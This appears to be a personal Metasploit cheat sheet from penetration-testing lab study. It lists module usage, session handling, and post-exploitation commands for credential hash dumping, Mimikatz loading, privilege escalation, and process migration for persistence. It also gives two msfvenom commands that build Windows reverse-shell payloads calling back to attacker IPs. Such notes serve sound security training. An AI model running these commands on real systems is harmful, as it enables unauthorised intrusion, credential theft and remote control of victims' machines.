==================================
| Main process to use MetaSploit |
==================================

search 		-> To look for a module to use
use 		-> To load the module
options 	-> To view any options you need to set
set <options> 	-> Set the specified option
run 		-> Run the exploit

==========================
| Other usefull commands |
==========================

:: Channels


:: Information gathering
getuid						-> Get the current user
getprivs					-> Get the priveleges for the current user
sysinfo						-> Get info on the system

:: Kiwi/Mimikatz can be loaded into the session
load kiwi					-> help now shows more commands

:: Menu, go back to from session
background

:: Move/migrate to another process (for priveleges)
migrate -N <process name>

:: Passwords
hashdump					-> Dumps all the hashes available on a computer when the required priveleges are met.

:: Payloads
show payloads					-> When a module is selected it will list compatible payloads
set payload <id>				-> Selects the listed payload with the corresponding number.
set payload <name>				-> Selects the payload with the corresponding name.

:: Privelege escalataion (for Windows at least)
getsystem 					-> when in a meterpreter session

:: Quiting or closing a session
quit 				

:: Search exploits
use post/multi/recon/local_exploit_suggester 	-> Can be used to find any vulnerabilities on the system. Does need an active session.

:: Searching for modules
search <keyword 1> <kayword 2> ...

:: Sessions
sessions 					-> show all
sessions -i <id> 				-> select and go to session
sessions -u 					-> upgrade shel to meterpreter shell
sessions -k <id>				-> kill selected session

:: Shel creation after exploiting
shell

:: Shell conversion to Meterpreter
post/multi/manage/shell_to_meterpreter		-> Converts a regular shell to a meterpreter session

:: Show various possibilities (payloads/exploits etc.)
show payloads
show exploits
show -h

=====================
| Metasploit Module |
=====================

run post/windows/manage/migrate 
-> Run the migrate module that can be used to inject into another process to create persistence


=====================
| MSFVenom Commands |
=====================

msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.18.78.136 LPORT=443 -b '\x0a\x0d\x00' -f c

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe

msfvenom -l / --list formats			-> Show all available formats
msfvenom -l / --list payloads			-> Show all available payloads
msfvenom -e					-> Specifies the encoding format
msfvenom -f					-> Specifies the output format (extension)
msfvenom -o					-> Specifies the output location

=======================
| Database/workspaces |
=======================

:: Outside of Metasploit
systemctl start postgresql			-> Start postgreSQL used by Metasploit
sudo msfdb init					-> start Metasploit database

:: Inside metasploit
db_status					-> Check database status

:: Workspaces
workspace					-> List workspaces
workspace -a tryhackme				-> Add workspace
workspace default				-> Select workspace

set hosts -R					-> Settings an RHOSTS options as the one stored in the database
